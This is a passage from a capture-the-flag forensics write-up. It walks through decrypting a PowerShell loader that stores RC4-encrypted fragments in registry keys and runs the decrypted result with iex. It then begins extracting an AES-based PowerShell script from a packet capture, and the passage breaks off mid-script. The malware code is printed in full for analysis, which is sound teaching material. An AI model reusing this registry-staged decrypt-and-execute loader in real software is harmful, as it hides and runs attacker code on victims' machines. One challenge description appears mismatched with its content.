class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encr</span></span> &#123;</span><br><span class="line">    <span class="keyword">param</span>(</span><br><span class="line">        [<span class="built_in">Byte</span>[]]<span class="variable">$data</span>,</span><br><span class="line">        [<span class="built_in">Byte</span>[]]<span class="variable">$key</span></span><br><span class="line">      )</span><br><span class="line"> </span><br><span class="line">    [<span class="built_in">Byte</span>[]]<span class="variable">$buffer</span> = <span class="built_in">New-Object</span> Byte[] <span class="variable">$data</span>.Length</span><br><span class="line">    <span class="variable">$data</span>.CopyTo(<span class="variable">$buffer</span>, <span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    [<span class="built_in">Byte</span>[]]<span class="variable">$s</span> = <span class="built_in">New-Object</span> Byte[] <span class="number">256</span>;</span><br><span class="line">    [<span class="built_in">Byte</span>[]]<span class="variable">$k</span> = <span class="built_in">New-Object</span> Byte[] <span class="number">256</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="number">256</span>; <span class="variable">$i</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$s</span>[<span class="variable">$i</span>] = [<span class="built_in">Byte</span>]<span class="variable">$i</span>;</span><br><span class="line">        <span class="variable">$k</span>[<span class="variable">$i</span>] = <span class="variable">$key</span>[<span class="variable">$i</span> % <span class="variable">$key</span><span class="type">.Length</span>];</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$j</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="number">256</span>; <span class="variable">$i</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$j</span> = (<span class="variable">$j</span> + <span class="variable">$s</span>[<span class="variable">$i</span>] + <span class="variable">$k</span>[<span class="variable">$i</span>]) % <span class="number">256</span>;</span><br><span class="line">        <span class="variable">$temp</span> = <span class="variable">$s</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$s</span>[<span class="variable">$i</span>] = <span class="variable">$s</span>[<span class="variable">$j</span>];</span><br><span class="line">        <span class="variable">$s</span>[<span class="variable">$j</span>] = <span class="variable">$temp</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$i</span> = <span class="variable">$j</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$x</span> = <span class="number">0</span>; <span class="variable">$x</span> <span class="operator">-lt</span> <span class="variable">$buffer</span>.Length; <span class="variable">$x</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$i</span> = (<span class="variable">$i</span> + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        <span class="variable">$j</span> = (<span class="variable">$j</span> + <span class="variable">$s</span>[<span class="variable">$i</span>]) % <span class="number">256</span>;</span><br><span class="line">        <span class="variable">$temp</span> = <span class="variable">$s</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$s</span>[<span class="variable">$i</span>] = <span class="variable">$s</span>[<span class="variable">$j</span>];</span><br><span class="line">        <span class="variable">$s</span>[<span class="variable">$j</span>] = <span class="variable">$temp</span>;</span><br><span class="line">        [<span class="built_in">int</span>]<span class="variable">$t</span> = (<span class="variable">$s</span>[<span class="variable">$i</span>] + <span class="variable">$s</span>[<span class="variable">$j</span>]) % <span class="number">256</span>;</span><br><span class="line">        <span class="variable">$buffer</span>[<span class="variable">$x</span>] = <span class="variable">$buffer</span>[<span class="variable">$x</span>] <span class="operator">-bxor</span> <span class="variable">$s</span>[<span class="variable">$t</span>];</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$buffer</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">HexToBin</span></span> &#123;</span><br><span class="line">    <span class="keyword">param</span>(</span><br><span class="line">    [<span class="type">Parameter</span>(</span><br><span class="line">        <span class="type">Position</span>=<span class="number">0</span>, </span><br><span class="line">        <span class="type">Mandatory</span>=<span class="variable">$true</span>, </span><br><span class="line">        <span class="type">ValueFromPipeline</span>=<span class="variable">$true</span>)</span><br><span class="line">    ]   </span><br><span class="line">    [<span class="built_in">string</span>]<span class="variable">$s</span>)</span><br><span class="line">    <span class="variable">$return</span> = <span class="selector-tag">@</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$s</span>.Length ; <span class="variable">$i</span> += <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$return</span> += [<span class="built_in">Byte</span>]::Parse(<span class="variable">$s</span>.Substring(<span class="variable">$i</span>, <span class="number">2</span>), [<span class="type">System.Globalization.NumberStyles</span>]::HexNumber)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">Write-Output</span> <span class="variable">$return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[<span class="built_in">Byte</span>[]]<span class="variable">$key</span> = <span class="variable">$enc</span>.GetBytes(<span class="string">&quot;Q0mmpr4B5rvZi3pS&quot;</span>)</span><br><span class="line"><span class="variable">$encrypted1</span> = (<span class="built_in">Get-ItemProperty</span> <span class="literal">-Path</span> HKCU:\SOFTWARE\ZYb78P4s).t3RBka5tL</span><br><span class="line"><span class="variable">$encrypted2</span> = (<span class="built_in">Get-ItemProperty</span> <span class="literal">-Path</span> HKCU:\SOFTWARE\BjqAtIen).uLltjjW</span><br><span class="line"><span class="variable">$encrypted3</span> = (<span class="built_in">Get-ItemProperty</span> <span class="literal">-Path</span> HKCU:\SOFTWARE\AppDataLow\t03A1Stq).uY4S39Da</span><br><span class="line"><span class="variable">$encrypted4</span> = (<span class="built_in">Get-ItemProperty</span> <span class="literal">-Path</span> HKCU:\SOFTWARE\Google\Nv50zeG).Kb19fyhl</span><br><span class="line"><span class="variable">$encrypted5</span> = (<span class="built_in">Get-ItemProperty</span> <span class="literal">-Path</span> HKCU:\AppEvents\Jx66ZG0O).jH54NW8C</span><br><span class="line"><span class="variable">$encrypted</span> = <span class="string">&quot;<span class="variable">$</span>(<span class="variable">$encrypted1</span>)<span class="variable">$</span>(<span class="variable">$encrypted2</span>)<span class="variable">$</span>(<span class="variable">$encrypted3</span>)<span class="variable">$</span>(<span class="variable">$encrypted4</span>)<span class="variable">$</span>(<span class="variable">$encrypted5</span>)&quot;</span></span><br><span class="line"><span class="variable">$enc</span> = [<span class="type">System.Text.Encoding</span>]::ASCII</span><br><span class="line">[<span class="built_in">Byte</span>[]]<span class="variable">$data</span> = HexToBin <span class="variable">$encrypted</span></span><br><span class="line"><span class="variable">$DecryptedBytes</span> = encr <span class="variable">$data</span> <span class="variable">$key</span></span><br><span class="line"><span class="variable">$DecryptedString</span> = <span class="variable">$enc</span>.GetString(<span class="variable">$DecryptedBytes</span>)</span><br><span class="line"><span class="variable">$DecryptedString</span>|<span class="built_in">iex</span></span><br></pre></td></tr></table></figure><p>It’s basically doing an encryption of 5 strings with the key <code>Q0mmpr4B5rvZi3pS</code> . The encrypted strings are in the variables <code>$encrypted1</code> —&gt; <code>$encrypted5</code> but If you notice, the actual value of the strings is not in the script it’s only showing the path of it like <code>Get-ItemProperty -Path HKCU:\SOFTWARE\ZYb78P4s</code> for example. So all we have to do is to grab the real value of the encrypted string from each registry key. To do so I used a tool called <code>regshell</code></p><p>We can do <code>regshell -F NTUSER.DAT</code> and it will give us a shell that we can go through using normal commands like <code>ls</code>, <code>cd</code> and <code>cat</code> </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F45711d94-eb86-41fb-b443-82a24ce32b9c%2FUntitled.png?id=47a99333-f7f9-44b2-acda-845bab11076f&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1260&userId=&cache=v2" alt="forensics"></p><p>Let’s go to every registry key mentioned in the script and grab the encrypted string each time then change it in the script.</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fc5da22fc-3b48-4166-b8b6-39e7d0440747%2FUntitled.png?id=a0864a50-767f-4126-a25f-ef82507b4a4a&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="forensics"></p><p>After doing the same thing to all the paths we can rebuild our script </p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encr</span></span> &#123;</span><br><span class="line">    <span class="keyword">param</span>(</span><br><span class="line">        [<span class="built_in">Byte</span>[]]<span class="variable">$data</span>,</span><br><span class="line">        [<span class="built_in">Byte</span>[]]<span class="variable">$key</span></span><br><span class="line">      )</span><br><span class="line"> </span><br><span class="line">    [<span class="built_in">Byte</span>[]]<span class="variable">$buffer</span> = <span class="built_in">New-Object</span> Byte[] <span class="variable">$data</span>.Length</span><br><span class="line">    <span class="variable">$data</span>.CopyTo(<span class="variable">$buffer</span>, <span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    [<span class="built_in">Byte</span>[]]<span class="variable">$s</span> = <span class="built_in">New-Object</span> Byte[] <span class="number">256</span>;</span><br><span class="line">    [<span class="built_in">Byte</span>[]]<span class="variable">$k</span> = <span class="built_in">New-Object</span> Byte[] <span class="number">256</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="number">256</span>; <span class="variable">$i</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$s</span>[<span class="variable">$i</span>] = [<span class="built_in">Byte</span>]<span class="variable">$i</span>;</span><br><span class="line">        <span class="variable">$k</span>[<span class="variable">$i</span>] = <span class="variable">$key</span>[<span class="variable">$i</span> % <span class="variable">$key</span><span class="type">.Length</span>];</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$j</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="number">256</span>; <span class="variable">$i</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$j</span> = (<span class="variable">$j</span> + <span class="variable">$s</span>[<span class="variable">$i</span>] + <span class="variable">$k</span>[<span class="variable">$i</span>]) % <span class="number">256</span>;</span><br><span class="line">        <span class="variable">$temp</span> = <span class="variable">$s</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$s</span>[<span class="variable">$i</span>] = <span class="variable">$s</span>[<span class="variable">$j</span>];</span><br><span class="line">        <span class="variable">$s</span>[<span class="variable">$j</span>] = <span class="variable">$temp</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$i</span> = <span class="variable">$j</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$x</span> = <span class="number">0</span>; <span class="variable">$x</span> <span class="operator">-lt</span> <span class="variable">$buffer</span>.Length; <span class="variable">$x</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$i</span> = (<span class="variable">$i</span> + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        <span class="variable">$j</span> = (<span class="variable">$j</span> + <span class="variable">$s</span>[<span class="variable">$i</span>]) % <span class="number">256</span>;</span><br><span class="line">        <span class="variable">$temp</span> = <span class="variable">$s</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$s</span>[<span class="variable">$i</span>] = <span class="variable">$s</span>[<span class="variable">$j</span>];</span><br><span class="line">        <span class="variable">$s</span>[<span class="variable">$j</span>] = <span class="variable">$temp</span>;</span><br><span class="line">        [<span class="built_in">int</span>]<span class="variable">$t</span> = (<span class="variable">$s</span>[<span class="variable">$i</span>] + <span class="variable">$s</span>[<span class="variable">$j</span>]) % <span class="number">256</span>;</span><br><span class="line">        <span class="variable">$buffer</span>[<span class="variable">$x</span>] = <span class="variable">$buffer</span>[<span class="variable">$x</span>] <span class="operator">-bxor</span> <span class="variable">$s</span>[<span class="variable">$t</span>];</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$buffer</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">HexToBin</span></span> &#123;</span><br><span class="line">    <span class="keyword">param</span>(</span><br><span class="line">    [<span class="type">Parameter</span>(</span><br><span class="line">        <span class="type">Position</span>=<span class="number">0</span>, </span><br><span class="line">        <span class="type">Mandatory</span>=<span class="variable">$true</span>, </span><br><span class="line">        <span class="type">ValueFromPipeline</span>=<span class="variable">$true</span>)</span><br><span class="line">    ]   </span><br><span class="line">    [<span class="built_in">string</span>]<span class="variable">$s</span>)</span><br><span class="line">    <span class="variable">$return</span> = <span class="selector-tag">@</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$s</span>.Length ; <span class="variable">$i</span> += <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$return</span> += [<span class="built_in">Byte</span>]::Parse(<span class="variable">$s</span>.Substring(<span class="variable">$i</span>, <span class="number">2</span>), [<span class="type">System.Globalization.NumberStyles</span>]::HexNumber)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">Write-Output</span> <span class="variable">$return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[<span class="built_in">Byte</span>[]]<span class="variable">$key</span> = <span class="variable">$enc</span>.GetBytes(<span class="string">&quot;Q0mmpr4B5rvZi3pS&quot;</span>)</span><br><span class="line"><span class="variable">$encrypted1</span> = <span class="string">&quot;F844A6035CF27CC4C90DFEAF579398BE6F7D5ED10270BD12A661DAD04191347559B82ED546015B07317000D8909939A4DA7953AED8B83C0FEE4EB6E120372F536BC5DC39&quot;</span> <span class="comment">#(Get-ItemProperty -Path HKCU:\SOFTWARE\ZYb78P4s).t3RBka5tL</span></span><br><span class="line"><span class="variable">$encrypted2</span> = <span class="string">&quot;CC19F66A5F3B2E36C9B810FE7CC4D9CE342E8E00138A4F7F5CDD9EED9E09299DD7C6933CF4734E12A906FD9CE1CA57D445DB9CABF850529F5845083F34BA1&quot;</span> <span class="comment">#(Get-ItemProperty -Path HKCU:\SOFTWARE\BjqAtIen).uLltjjW</span></span><br><span class="line"><span class="variable">$encrypted3</span> = <span class="string">&quot;C08114AA67EB979D36DC3EFA0F62086B947F672BD8F966305A98EF93AA39076C3726B0EDEBFA10811A15F1CF1BEFC78AFC5E08AD8CACDB323F44B4D&quot;</span> <span class="comment">#(Get-ItemProperty -Path HKCU:\SOFTWARE\AppDataLow\t03A1Stq).uY4S39Da</span></span><br><span class="line"><span class="variable">$encrypted4</span> = <span class="string">&quot;D814EB4E244A153AF8FAA1121A5CCFD0FEAC8DD96A9B31CCF6C3E3E03C1E93626DF5B3E0B141467116CC08F92147F7A0BE0D95B0172A7F34922D6C236BC7DE54D8ACBFA70D1&quot;</span> <span class="comment">#(Get-ItemProperty -Path HKCU:\SOFTWARE\Google\Nv50zeG).Kb19fyhl</span></span><br><span class="line"><span class="variable">$encrypted5</span> = <span class="string">&quot;84AB553E67C743BE696A0AC80C16E2B354C2AE7918EE08A0A3887875C83E44ACA7393F1C579EE41BCB7D336CAF8695266839907F47775F89C1F170562A6B0A01C0F3BC4CB&quot;</span> <span class="comment">#(Get-ItemProperty -Path HKCU:\AppEvents\Jx66ZG0O).jH54NW8C</span></span><br><span class="line"><span class="variable">$encrypted</span> = <span class="string">&quot;<span class="variable">$</span>(<span class="variable">$encrypted1</span>)<span class="variable">$</span>(<span class="variable">$encrypted2</span>)<span class="variable">$</span>(<span class="variable">$encrypted3</span>)<span class="variable">$</span>(<span class="variable">$encrypted4</span>)<span class="variable">$</span>(<span class="variable">$encrypted5</span>)&quot;</span></span><br><span class="line"><span class="variable">$enc</span> = [<span class="type">System.Text.Encoding</span>]::ASCII</span><br><span class="line">[<span class="built_in">Byte</span>[]]<span class="variable">$data</span> = HexToBin <span class="variable">$encrypted</span></span><br><span class="line"><span class="variable">$DecryptedBytes</span> = encr <span class="variable">$data</span> <span class="variable">$key</span></span><br><span class="line"><span class="variable">$DecryptedString</span> = <span class="variable">$enc</span>.GetString(<span class="variable">$DecryptedBytes</span>)</span><br><span class="line"><span class="variable">$DecryptedString</span></span><br></pre></td></tr></table></figure><p>Now if we run this it’s supposed to print the flag for us but for some reasons it didn’t work for me so I did it with <strong>CyberChef</strong> instead. I used <code>RC4</code> to decrypt with the : </p><ul><li>input being the values we got from the registry keys</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F844A6035CF27CC4C90DFEAF579398BE6F7D5ED10270BD12A661DAD04191347559B82ED546015B07317000D8909939A4DA7953AED8B83C0FEE4EB6E120372F536BC5DC39CC19F66A5F3B2E36C9B810FE7CC4D9CE342E8E00138A4F7F5CDD9EED9E09299DD7C6933CF4734E12A906FD9CE1CA57D445DB9CABF850529F5845083F34BA1C08114AA67EB979D36DC3EFA0F62086B947F672BD8F966305A98EF93AA39076C3726B0EDEBFA10811A15F1CF1BEFC78AFC5E08AD8CACDB323F44B4DD814EB4E244A153AF8FAA1121A5CCFD0FEAC8DD96A9B31CCF6C3E3E03C1E93626DF5B3E0B141467116CC08F92147F7A0BE0D95B0172A7F34922D6C236BC7DE54D8ACBFA70D184AB553E67C743BE696A0AC80C16E2B354C2AE7918EE08A0A3887875C83E44ACA7393F1C579EE41BCB7D336CAF8695266839907F47775F89C1F170562A6B0A01C0F3BC4CB</span><br></pre></td></tr></table></figure><ul><li>Passphrase we found in the script</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Q0mmpr4B5rvZi3<span class="built_in">pS</span></span><br></pre></td></tr></table></figure><p>If we do so , we get our flag.</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F7cfe7cae-436c-43b1-9710-271a33156df7%2FUntitled.png?id=d2778d4c-6b96-4da4-b760-c45686f37cfc&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="forensics"></p><p><code>Flag : HTB&#123;g0ld3n_F4ng_1s_n0t_st34lthy_3n0ugh&#125;</code></p><hr><h2 id="Automation"><a href="#Automation" class="headerlink" title="Automation"></a>Automation</h2><h3 id="Challenge-Description-2"><a href="#Challenge-Description-2" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Miyuki&#x27;s team stores all the evidence from important cases in a shared RAID 5 disk. Especially now that the case IMW-1337 is almost completed, evidences and clues are needed more than ever. Unfortunately for the team, an electromagnetic pulse caused by Draeger&#x27;s EMP cannon has partially destroyed the disk. Can you help her and the rest of team recover the content of the failed disk? Download: http://134.209.177.115/forensics/forensics_intergalactic_recovery.zip</span><br></pre></td></tr></table></figure><p>We are given a <code>capture.pcap</code> which we can open in Wireshark </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fd64d791b-c925-48b7-bb0b-f0d56bfe779e%2FUntitled.png?id=d9e4f0ad-f9c2-4945-aaa2-5214eb38d18f&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="forensics"></p><p>There are different protocols used in this one like TCP and DNS </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F6157a892-f0ac-48a2-9091-c9f3650336b2%2FUntitled.png?id=ad1caaf4-5b68-438f-9249-e104ed024924&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="forensics"></p><p>Let’s try to follow some TCP streams </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F1102c00c-59a5-44ac-9278-3f35da0010b5%2FUntitled.png?id=4dd0a7e5-0edc-4548-a287-a5524f8beb71&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="forensics"></p><p>I started going through each stream until I found this one which is TCP stream number 17</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F44c66533-0215-4016-8fb2-90b88188d32c%2FUntitled.png?id=897533f0-1cd9-4f42-ba27-9d215531caad&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="forensics"></p><p>It contains a base64 encoded value. I saved it in a file and decoded it in my terminal </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F01ae81eb-98a2-402e-96c4-533a099280b5%2FUntitled.png?id=62416bbf-df70-496d-a479-5df3ce053c1f&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1470&userId=&cache=v2" alt="forensics"></p><p>It is a PowerShell script </p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Create-AesManagedObject</span><span class="params">(<span class="variable">$key</span>, <span class="variable">$IV</span>)</span></span> &#123;</span><br><span class="line">    <span class="variable">$aesManaged</span> = <span class="built_in">New-Object</span> <span class="string">&quot;System.Security.Cryptography.AesManaged&quot;</span></span><br><span class="line">    <span class="variable">$aesManaged</span>.Mode = [<span class="type">System.Security.Cryptography.CipherMode</span>]::CBC</span><br><span class="line">    <span class="variable">$aesManaged</span>.Padding = [<span class="type">System.Security.Cryptography.PaddingMode</span>]::Zeros</span><br><span class="line">    <span class="variable">$aesManaged</span>.BlockSize = <span class="number">128</span></span><br><span class="line">    <span class="variable">$aesManaged</span>.KeySize = <span class="number">256</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$IV</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$IV</span>.getType().Name <span class="operator">-eq</span> <span class="string">&quot;String&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$aesManaged</span>.IV = [<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$IV</span>)</span><br><span class="line">     </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$aesManaged</span>.IV = <span class="variable">$IV</span></span><br><span class="line">     </span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$key</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$key</span>.getType().Name <span class="operator">-eq</span> <span class="string">&quot;String&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$aesManaged</span>.Key = [<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$key</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$aesManaged</span>.Key = <span class="variable">$key</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$aesManaged</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Create-AesKey</span><span class="params">()</span></span> &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="variable">$aesManaged</span> = Create<span class="literal">-AesManagedObject</span> <span class="variable">$key</span> <span class="variable">$IV</span></span><br><span class="line">    [<span class="type">System.Convert</span>]::ToBase64String(<span class="variable">$aesManaged</span>.Key)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Encrypt-String</span><span class="params">(<span class="variable">$key</span>, <span class="variable">$unencryptedString</span>)</span></span> &#123;</span><br><span class="line">    <span class="variable">$bytes</span> = [<span class="type">System.Text.Encoding</span>]::UTF8.GetBytes(<span class="variable">$unencryptedString</span>)</span><br><span class="line">    <span class="variable">$aesManaged</span> = Create<span class="literal">-AesManagedObject</span> <span class="variable">$key</span></span><br><span class="line">    <span class="variable">$encryptor</span> = <span class="variable">$aesManaged</span>.CreateEncryptor()</span><br><span class="line">    <span class="variable">$encryptedData</span> = <span class="variable">$encryptor</span>.TransformFinalBlock(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length);</span><br><span class="line">    [<span class="built_in">byte</span>[]] <span class="variable">$fullData</span> = <span class="variable">$aesManaged</span>.IV + <span class="variable">$encryptedData</span></span><br><span class="line">    <span class="variable">$aesManaged</span>.Dispose()</span><br><span class="line">    [<span class="type">System.BitConverter</span>]::ToString(<span class="variable">$fullData</span>).replace(<span class="string">&quot;-&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Decrypt-String</span><span class="params">(<span class="variable">$key</span>, <span class="variable">$encryptedStringWithIV</span>)</span></span> &#123;</span><br><span class="line">    <span class="variable">$bytes</span> = [<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$encryptedStringWithIV</span>)</span><br><span class="line">    <span class="variable">$IV</span> = <span class="variable">$bytes</span>[<span class="number">0</span><span class="type">..15</span>]</span><br><span class="line">    <span class="variable">$aesManaged</span> = Create<span class="literal">-AesManagedObject</span> <span class="variable">$key</span> <span class="variable">$IV</span></span><br><span class="line">    <span class="variable">$decryptor</span> = <span class="variable">$aesManaged</span>.CreateDecryptor();</span><br><span class="line">    <span class="variable">$unencryptedData</span> = <span class="variable">$decryptor</span>.TransformFinalBlock(<span class="variable">$bytes</span>, <span class="number">16</span>, <span class="variable">$bytes</span>.Length - <span class="number">16</span>);</span><br><span class="line">    <span 